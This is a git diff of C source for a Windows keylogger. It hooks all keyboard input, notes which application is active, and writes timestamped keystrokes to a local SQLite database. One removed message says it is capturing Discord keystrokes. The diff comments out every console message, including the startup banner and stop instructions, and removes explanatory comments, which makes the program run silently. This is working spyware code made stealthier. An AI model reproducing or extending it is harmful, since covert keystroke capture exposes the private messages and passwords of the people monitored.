@@ -6,16 +6,13 @@
 #ifdef _WIN32
 #include <windows.h>
 #include <psapi.h>  // For GetModuleFileNameEx
-#pragma comment(lib, "psapi.lib")  // Link with psapi.lib
+#pragma comment(lib, "psapi.lib")
 #endif
 
-// Database path - adjust this to match your project structure
-#define DB_PATH "C:/Users/Ben/CLionProjects/SaveInput/KeyLogger/data/database.db"
+#define DB_PATH "../../data/database.db"
 
-// SQLite database connection
 sqlite3 *db = NULL;
 
-// Function prototypes
 int init_database();
 int log_key_press(const char *key, double press_time, double release_time);
 void cleanup_database();
@@ -82,7 +79,6 @@ LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 
-// Get active window executable name
 char* get_active_window_name() {
     char* window_name = malloc(256);
     if (!window_name) return NULL;
@@ -110,7 +106,7 @@ char* get_active_window_name() {
 
     CloseHandle(process);
 
-    // Extract just the executable name from the path
+    // get exe name
     char* filename = strrchr(window_name, '\\');
     if (filename) {
         char* temp = _strdup(filename + 1);
@@ -121,27 +117,23 @@ char* get_active_window_name() {
     return window_name;
 }
 
-// Get current time with microsecond precision (matches Python's time.perf_counter())
 double get_high_precision_time() {
     LARGE_INTEGER frequency, counter;
     QueryPerformanceFrequency(&frequency);
     QueryPerformanceCounter(&counter);
-    // Returns time in seconds with microsecond precision (same as Python's time.perf_counter())
     return (double)counter.QuadPart / (double)frequency.QuadPart;
 }
 #endif
 
-// Initialize the SQLite database
 int init_database() {
     int rc = sqlite3_open(DB_PATH, &db);
 
     if (rc != SQLITE_OK) {
-        fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
+        //fprintf(stderr, "Cannot open database: %s\n", sqlite3_errmsg(db));
         sqlite3_close(db);
         return -1;
     }
 
-    // Create table if it doesn't exist
     const char *sql = "CREATE TABLE IF NOT EXISTS messages ("
                      "press_time REAL, "
                      "release_time REAL, "
@@ -151,16 +143,15 @@ int init_database() {
     rc = sqlite3_exec(db, sql, 0, 0, &err_msg);
 
     if (rc != SQLITE_OK) {
-        fprintf(stderr, "SQL error: %s\n", err_msg);
+        //fprintf(stderr, "SQL error: %s\n", err_msg);
         sqlite3_free(err_msg);
         return -1;
     }
 
-    printf("Database initialized successfully.\n");
+    //printf("Database initialized successfully.\n");
     return 0;
 }
 
-// Log a key press to the database
 int insert_key_press(const char *key, double press_time) {
     if (!db) return -1;
 
@@ -169,7 +160,7 @@ int insert_key_press(const char *key, double press_time) {
 
     int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
     if (rc != SQLITE_OK) {
-        fprintf(stderr, "Insert prepare failed: %s\n", sqlite3_errmsg(db));
+        //fprintf(stderr, "Insert prepare failed: %s\n", sqlite3_errmsg(db));
         return -1;
     }
 
@@ -178,13 +169,13 @@ int insert_key_press(const char *key, double press_time) {
 
     rc = sqlite3_step(stmt);
     if (rc != SQLITE_DONE) {
-        fprintf(stderr, "Insert failed: %s\n", sqlite3_errmsg(db));
+        //fprintf(stderr, "Insert failed: %s\n", sqlite3_errmsg(db));
         sqlite3_finalize(stmt);
         return -1;
     }
 
     sqlite3_finalize(stmt);
-    printf("Inserted key press: %s at %.3fs\n", key, press_time);
+    //printf("Inserted key press: %s at %.3fs\n", key, press_time);
     return 0;
 }
 int update_key_release(const char *key, double release_time) {
@@ -192,26 +183,25 @@ int update_key_release(const char *key, double release_time) {
 
     sqlite3_stmt *stmt;
 
-    // Correct SQL with subquery to get the most recent matching row
     const char *sql = "UPDATE messages SET release_time = ? "
                       "WHERE rowid = ("
                       "  SELECT rowid FROM messages "
                       "  WHERE message = ? AND release_time IS NULL "
                       "  ORDER BY press_time DESC LIMIT 1"
                       ")";
-    printf("Inserted key release: %s at %.3fs\n", key, release_time);
+    //printf("Inserted key release: %s at %.3fs\n", key, release_time);
     int rc = sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);
     if (rc != SQLITE_OK) {
-        fprintf(stderr, "Update prepare failed: %s\n", sqlite3_errmsg(db));
+        //fprintf(stderr, "Update prepare failed: %s\n", sqlite3_errmsg(db));
         return -1;
     }
 
-    sqlite3_bind_double(stmt, 1, release_time);  // Bind release_time
-    sqlite3_bind_text(stmt, 2, key, -1, SQLITE_STATIC);  // Bind key
+    sqlite3_bind_double(stmt, 1, release_time);
+    sqlite3_bind_text(stmt, 2, key, -1, SQLITE_STATIC);
 
     rc = sqlite3_step(stmt);
     if (rc != SQLITE_DONE) {
-        fprintf(stderr, "Failed to update data: %s\n", sqlite3_errmsg(db));
+        //fprintf(stderr, "Failed to update data: %s\n", sqlite3_errmsg(db));
         sqlite3_finalize(stmt);
         return -1;
     }
@@ -219,47 +209,41 @@ int update_key_release(const char *key, double release_time) {
     sqlite3_finalize(stmt);
     return 0;
 }
-// Clean up database connection
 void cleanup_database() {
     if (db) {
         sqlite3_close(db);
-        printf("Database connection closed.\n");
+        //printf("Database connection closed.\n");
     }
 }
 
 int main() {
-    printf("C KeyLogger starting...\n");
+    //printf("C KeyLogger starting...\n");
 
-    // Initialize database
     if (init_database() != 0) {
-        fprintf(stderr, "Failed to initialize database. Exiting.\n");
+        //fprintf(stderr, "Failed to initialize database. Exiting.\n");
         return 1;
     }
 
 #ifdef _WIN32
-    // Set up keyboard hook for Windows
     keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
 
     if (!keyboard_hook) {
-        fprintf(stderr, "Failed to set keyboard hook. Error code: %lu\n", GetLastError());
+        //fprintf(stderr, "Failed to set keyboard hook. Error code: %lu\n", GetLastError());
         cleanup_database();
         return 1;
     }
 
-    printf("Keyboard hook installed. Capturing Discord keystrokes...\n");
-    printf("Press Ctrl+C in this window to stop.\n");
+    //printf("Keyboard hook installed. Capturing Discord keystrokes...\n");
+    //printf("Press Ctrl+C in this window to stop.\n");
 
-    // Message loop to keep the program running
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
-    // Clean up
     UnhookWindowsHookEx(keyboard_hook);
 #else
-    // For non-Windows platforms, we would implement different keyboard hooks
     printf("Keyboard logging is currently only supported on Windows.\n");
 #endif
 
